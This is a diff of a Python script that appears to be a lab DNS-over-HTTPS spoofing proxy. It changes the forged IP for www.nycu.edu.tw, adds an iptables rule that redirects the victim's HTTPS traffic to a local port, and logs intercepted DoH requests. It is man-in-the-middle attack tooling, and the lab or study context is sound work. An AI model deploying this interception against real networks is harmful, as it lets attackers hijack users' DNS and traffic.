@@ -17,7 +17,7 @@ from hypercorn.config import Config
 
 LISTEN_PORT = 4443
 SPOOF_DOMAIN = "www.nycu.edu.tw"
-SPOOF_IPV4 = "192.168.126.132"  
+SPOOF_IPV4 = "192.168.126.123"  
 SPOOF_TTL = 60
 
 UPSTREAM_DOH_URL = os.getenv("UPSTREAM_DOH_URL", "https://mozilla.cloudflare-dns.com/dns-query")
@@ -32,7 +32,8 @@ def setup_network():
     cmds = [
         f"sudo sysctl -w net.ipv4.ip_forward=1",
         "sudo iptables -t nat -F",
-        "sudo iptables -A OUTPUT -p icmp --icmp-type redirect -j DROP"
+        "sudo iptables -A OUTPUT -p icmp --icmp-type redirect -j DROP",
+        f"sudo iptables -t nat -A PREROUTING -p tcp -d {SPOOF_IPV4} --dport 443 -j REDIRECT --to-port 5443"
     ]
     # Redirect traffic for real Cloudflare DoH to our local proxy
     for ip in CLOUDFLARE_IPS:
@@ -104,6 +105,7 @@ async def app(scope, receive, send):
 
     if scope["type"] != "http" or scope["path"] != "/dns-query":
         return
+    print(f"[*] Received {scope['method']} request for {scope['path']}")
 
     # Extract DNS query from GET or POST
     query_string = scope.get("query_string", b"")
